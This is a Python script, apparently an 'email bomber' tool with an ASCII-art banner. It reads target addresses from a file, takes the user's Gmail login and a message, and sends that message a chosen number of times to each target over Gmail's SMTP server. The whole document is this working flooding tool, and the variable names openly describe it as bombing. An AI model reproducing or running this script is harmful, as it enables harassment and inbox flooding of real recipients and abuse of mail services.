import smtplib
from colorama import Fore, Style
import time
print ("███╗   ███╗██╗   ██╗████████╗██╗  ██╗██╗ ██████╗")
print ("████╗ ████║╚██╗ ██╔╝╚══██╔══╝██║  ██║██║██╔════╝")
print ("██╔████╔██║ ╚████╔╝    ██║   ███████║██║██║     ")
print ("██║╚██╔╝██║  ╚██╔╝     ██║   ██╔══██║██║██║     ")
print ("██║ ╚═╝ ██║   ██║      ██║   ██║  ██║██║╚██████╗")
print ("╚═╝     ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝")

files = open('email.txt', 'r')
bomb_emails = files.readlines()


email = input("Enter your gmail address:")
password = input("Enter your gmail password:")
message = input("What do you want to say?:")
message_relode = int(input("How many message you want to send?:"))


for bomb_email in bomb_emails:
    for x in range(0, message_relode):
        mail = smtplib.SMTP('smtp.gmail.com',587)
        mail.ehlo()
        mail.starttls()
        mail.login(email,password)
        mail.sendmail(email,bomb_email,message)
        print("message sent to {}".format(bomb_email))
    time.sleep(1)

mail.close()
files.close()

print("Done")
